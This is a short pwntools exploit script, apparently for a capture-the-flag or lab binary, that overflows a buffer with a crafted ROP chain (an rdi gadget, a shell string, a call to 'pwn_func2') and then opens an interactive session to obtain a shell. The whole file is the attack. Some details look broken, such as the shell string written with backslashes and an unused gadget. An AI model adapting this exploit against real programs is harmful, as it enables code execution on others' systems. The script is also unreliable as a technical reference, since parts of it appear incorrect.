#!/usr/bin/env python3
import sys
import pwn

exe = sys.argv[1]
elf = pwn.ELF(exe)
pwnfunc2 = elf.symbols['pwn_func2']
rop = pwn.ROP(elf)

rdi = rop.rdi

rdi2 = rop.find_gadget(["mov rdi, rax", "ret"])


payload = (b'prints '
            + (b'\xff' * 540)
            + (b'\0' * 4)
            + (b'\0' * 8)
            + pwn.p64(rdi.address)
            + b'\bin\sh$'
            + pwn.p64(pwnfunc2)
          )
print(f"PAYLOAD: {payload}")
with open("/dev/null") as err:
  io = pwn.process(exe,stderr=err)
  io.sendline(payload)
  io.recvuntil(b'Enter command: ')
  io.send(b'exec\n')
  out1 = io.recvuntil(b'\n')
  out2 = io.recvuntil((b'Enter command: ', b'\n'))
io.interactive()
